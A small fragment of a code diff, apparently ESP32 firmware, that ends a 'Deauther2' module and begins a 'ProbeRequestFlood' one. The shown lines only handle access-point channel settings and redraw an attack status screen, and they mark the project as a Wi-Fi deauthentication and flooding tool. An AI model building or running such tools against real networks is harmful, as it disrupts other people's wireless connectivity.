+        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+      }
+    }
+    last_channel_check = current_time;
+  }
+
+  static uint32_t last_status_time = 0;
+  if (attack_running && current_time - last_status_time > 2000) {
+    drawAttackScreen();
+    last_status_time = current_time;
+  }
+}
+
+}  // namespace Deauther2
 
 namespace ProbeRequestFlood {
 
